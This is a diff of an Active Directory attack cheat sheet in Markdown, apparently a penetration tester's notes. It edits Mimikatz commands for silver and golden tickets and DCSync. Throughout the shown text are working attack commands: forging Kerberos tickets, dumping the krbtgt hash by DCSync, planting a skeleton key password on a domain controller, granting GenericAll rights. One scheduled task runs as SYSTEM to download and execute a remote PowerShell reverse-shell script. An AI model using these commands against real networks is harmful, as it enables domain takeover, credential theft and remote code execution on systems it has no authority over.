@@ -108,7 +108,7 @@ Use DCsync Attack / more silent in DC Logs
 
 ### Requirement
 
-Machine account hash (e.g. after krbtgt&#x20;
+Machine account hash of DC (e.g. after krbtgt)
 
 ### Tools
 
@@ -116,7 +116,7 @@ Machine account hash (e.g. after krbtgt&#x20;
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dom.local /sid:S-1-5... /target:target-dc.local /service:cifs /rc4:hash /user:Administrator /ptt"'
 ```
 {% endcode %}
 
@@ -131,7 +131,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dom.local /sid:S-1-5... /tar
 
 **Schedudle an execute a task with silver ticket of "HOST" Service**
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:host /rc4:hash /user:Administrator /ptt"'
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-dc.local /service:host /rc4:hash /user:Administrator /ptt"'
 
 <strong>schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
 </strong><strong>
@@ -182,7 +182,7 @@ Rubeus.exe diamond
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'  => Any account can be used/synced
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  => Any account can be used/synced
 
 SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 ```
@@ -212,6 +212,9 @@ SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
+
+
+
 Enter-PSSession -computername dc-hostname -credential dom\Administrator
 Now you can login with the password "mimikatz"
 ```
@@ -473,8 +476,6 @@ Using AD Module
 Set-ADACL -samaccountname username -distinguishedname 'DC=subodmain,DC=domain,DC=local' -right GenericAll -verbose
 ```
 {% endcode %}
-
-
 
 **Add DCSync rights**
 
